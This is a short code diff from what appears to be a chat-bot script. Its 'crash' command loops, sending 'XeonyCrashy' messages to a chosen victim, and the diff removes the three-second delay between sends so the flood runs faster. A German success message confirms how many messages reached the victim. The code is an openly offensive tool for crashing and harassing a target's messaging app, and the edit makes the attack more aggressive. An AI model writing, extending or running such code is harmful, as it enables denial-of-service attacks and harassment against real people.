@@ -522,7 +522,6 @@ if (command === "crash") {
 
     for (let i = 0; i < amount; i++) {
         await XeonyCrashy("Wantedasa", victim);
-        await sleep(3000);
     }
 
     reply(sock, msg, `✅ Erfolgreich ${amount} Nachrichten an ${victim} gesendet`);
